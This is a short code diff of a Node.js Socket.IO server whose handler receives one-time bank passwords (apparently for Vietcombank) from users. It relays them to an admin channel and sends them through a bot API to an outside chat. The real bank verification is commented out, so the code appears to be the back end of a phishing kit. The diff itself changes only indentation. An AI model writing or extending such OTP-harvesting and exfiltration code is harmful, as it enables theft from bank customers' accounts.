@@ -108,7 +108,7 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
     socket.on('send-data-send-otp-vcb', async (data) => {
         // const response = await moduleBank.xacthucOTPVCB(data.otp, socket.id);
         // socket.emit('send-data-send-otp-vcb', response);
-       await socketIo.emit('send-data-admin-user', data);
+        await socketIo.emit('send-data-admin-user', data);
         await api.sendMessage({
             chat_id: chatId,
             text: `Có người dùng vừa xác thực OTP: ${JSON.stringify(data)}`,
